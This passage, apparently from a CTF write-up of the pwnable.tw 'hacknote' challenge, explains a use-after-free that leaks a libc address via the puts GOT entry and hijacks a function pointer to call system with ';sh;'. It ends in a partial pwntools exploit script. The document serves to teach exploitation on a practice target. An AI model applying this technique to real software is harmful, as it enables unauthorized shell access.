+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;print_note&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+{
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; index;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _canary;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; index_str [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;];
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; canary;
+  
+  canary &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)(_canary &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x14&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Index :&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  read(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,index_str,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  index &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;atoi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(index_str);
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;((index &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;|| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(counter &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;lt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; index)) {
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Out of bound!&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+                    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* WARNING: Subroutine does not return *&#x2F;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_exit(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  }
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;notes_list)[index] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(note &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+    (&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(code &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;notes_list)[index]-&amp;gt;print_func)((&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;notes_list)[index]);
+  }
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(canary &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!= *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)(_canary &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x14&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)) {
+                    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* WARNING: Subroutine does not return *&#x2F;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;__stack_chk_fail();
+  }
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The &lt;code&gt;print_note&lt;&#x2F;code&gt; function calls the function that was stored within the &lt;code&gt;note&lt;&#x2F;code&gt; struct with a pointer to the struct itself.&lt;&#x2F;p&gt;
+&lt;p&gt; &lt;&#x2F;p&gt;
+&lt;p&gt;The goal is clear. If we overwrite &lt;code&gt;note-&amp;gt;print_func&lt;&#x2F;code&gt; with a pointer to &lt;code&gt;system&lt;&#x2F;code&gt; and call &lt;code&gt;print_note&lt;&#x2F;code&gt; on that index, 
+we can get a shell. To do this, we need to leak a libc address. &lt;&#x2F;p&gt;
+&lt;h2 id=&quot;leaking-a-libc-address&quot;&gt;Leaking a libc address&lt;&#x2F;h2&gt;
+&lt;p&gt;To leak a libc address, we can simply print the contents of a global-offset-table (GOT) entry. The GOT contains pointers 
+to dynamically-linked libraries, and is populated by the linker at runtime. The GOT entry for &lt;code&gt;puts&lt;&#x2F;code&gt; would point to the address of &lt;code&gt;puts&lt;&#x2F;code&gt; within libc. &lt;&#x2F;p&gt;
+&lt;p&gt; &lt;&#x2F;p&gt;
+&lt;p&gt;To accomplish this, we can abuse the use-after-free to overwrite a freed &lt;code&gt;note&lt;&#x2F;code&gt; struct. The goal is to make a &lt;code&gt;note&lt;&#x2F;code&gt; 
+struct look like the following:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;note-&amp;gt;print_func &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x804862b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; Address of the default print_func used by the binary
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;note-&amp;gt;contents &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x804a024&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; Address of GOT entry for puts
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;code&gt;malloc&lt;&#x2F;code&gt; returns the first available memory region, and generally reuses previously &lt;code&gt;free&lt;&#x2F;code&gt;ed regions. However, it has 
+bins of specific sizes that generally are not moved. To demonstrate this, I made a small &lt;a href=&quot;https:&#x2F;&#x2F;repl.it&#x2F;repls&#x2F;PaltryTrustyBrace&quot;&gt;test program&lt;&#x2F;a&gt;:&lt;&#x2F;p&gt;
+&lt;iframe allowfullscreen=&quot;true&quot; allowtransparency=&quot;true&quot; frameborder=&quot;no&quot; height=&quot;800px&quot;
+        sandbox=&quot;allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts allow-modals&quot;
+        scrolling=&quot;no&quot; src=&quot;https:&#x2F;&#x2F;repl.it&#x2F;repls&#x2F;PaltryTrustyBrace?lite=true&quot; width=&quot;100%&quot;&gt;&lt;&#x2F;iframe&gt;
+&lt;p&gt;The &lt;code&gt;note&lt;&#x2F;code&gt; struct malloc 8 bytes for the struct, and n bytes for the contents. If we allocate 2 notes with 8 bytes of 
+contents each, and then free them, we can gain a pointer to the &lt;code&gt;note&lt;&#x2F;code&gt; struct. &lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; New note with 8 bytes content (Note A)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;malloc(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; = 0x00 Note A struct
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;malloc(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; = 0x10 Note A contents
+&#x2F;&#x2F; New note with 8 bytes content (Note B)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;malloc(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; = 0x20 Note B struct
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;malloc(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; = 0x30 Note B contents
+&#x2F;&#x2F; Delete note A
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;free(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x00&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+free(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; Delete note B
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;free(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+free(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x30&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; New note with 32 bytes contents (Note C)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;malloc(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; = 0x00 Note C struct  &amp;lt;-&amp;gt; Note A struct
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;malloc(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;); &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; = 0xA0 - This will be in a different bin from the smaller allocations
+&#x2F;&#x2F; New note with 8 bytes contents (Note D)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;malloc(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; = 0x10 Note D struct   &amp;lt;- Note A contents
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;malloc(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; = 0x20 Note D contents -&amp;gt; Note B struct
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Note D&#x27;s contents will overwrite Note B&#x27;s struct. Now we can simply set the contents of Note D to the needed values, and 
+the print out index 1 to leak the libc address of &lt;code&gt;puts&lt;&#x2F;code&gt;. To find the libc base address, we can subtract the address of 
+puts in the libc binary from the leaked address. Now we can find the address of any libc function. &lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LIBC_BASE &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LEAKED_ADDR &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;L_ADDR_PUTS
+ADDR_SYSTEM &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LIBC_BASE &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;L_ADDR_SYSTEM
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;h2 id=&quot;crafting-a-shell&quot;&gt;Crafting a shell&lt;&#x2F;h2&gt;
+&lt;p&gt;To spawn a shell, we need a &lt;code&gt;note&lt;&#x2F;code&gt;&#x27;s struct to look like the following:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;note-&amp;gt;print_func &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;system;     &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; Address of system calculated from the leaked base address
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;note-&amp;gt;contents &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;;sh;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; String to call &#x2F;bin&#x2F;sh
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Since &lt;code&gt;print_note&lt;&#x2F;code&gt; calls &lt;code&gt;note-&amp;gt;print_func&lt;&#x2F;code&gt; with a pointer to the note itself, this will call &lt;code&gt;system(&#x27;\x90\xd0\xab\xff;sh;\xff&#x27;)&lt;&#x2F;code&gt;. 
+The address of system itself will be provided as an argument. To still get a shell, we can surround &lt;code&gt;sh&lt;&#x2F;code&gt; with semi-colons 
+to make them appear as separate commands to the shell. &lt;&#x2F;p&gt;
+&lt;p&gt; &lt;&#x2F;p&gt;
+&lt;p&gt;We can reuse the setup we used to leak libc. If we just free the last note created (Note D), then we can create another 
+note that will also overwrite Note B&#x27;s struct:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;...
+&#x2F;&#x2F; New note with 8 bytes contents (Note D)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;malloc(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; = 0x10 Note D struct   &amp;lt;- Note A contents
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;malloc(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; = 0x20 Note D contents -&amp;gt; Note B struct
+&#x2F;&#x2F; Delete Note D
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;free(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+free(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; New note with 8 bytes contents (Note E)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;malloc(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; = 0x10 Note E struct &amp;lt;-&amp;gt; Note D struct   &amp;lt;-&amp;gt; Note A contents
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;malloc(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; = 0x20 Note E struct &amp;lt;-&amp;gt; Note D contents &amp;lt;-&amp;gt; Note B struct
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Now, if we print the note at index 1, we will get a shell.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;script&quot;&gt;Script&lt;&#x2F;h2&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;pwn &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;*
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;context.terminal &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&#x2F;bin&#x2F;sh&amp;#39;
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;r &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;remote(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;chall.pwnable.tw&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;10102&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+libc &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ELF(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;.&#x2F;libc_32.so.6&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+elf &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ELF(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;.&#x2F;hacknote&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;L_ADDR_SYSTEM &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;libc.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;system&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;]
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;L_ADDR_PUTS &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;libc.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;puts&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;]
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;ADDR_PUTS_GOT &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;elf.got[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;puts&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;]
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;ADDR_PRINT_FUNC &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x804862b
+
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;add_note&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(size, contents):
+    log.info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;Adding note: [size]: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;  [contents]: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(size, contents))
+    r.write(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+    r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;Note size :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+    r.write(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(size))
+    r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;Content :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+    r.write(contents)
+    r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;Success !&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+    skip_menu()
+
+
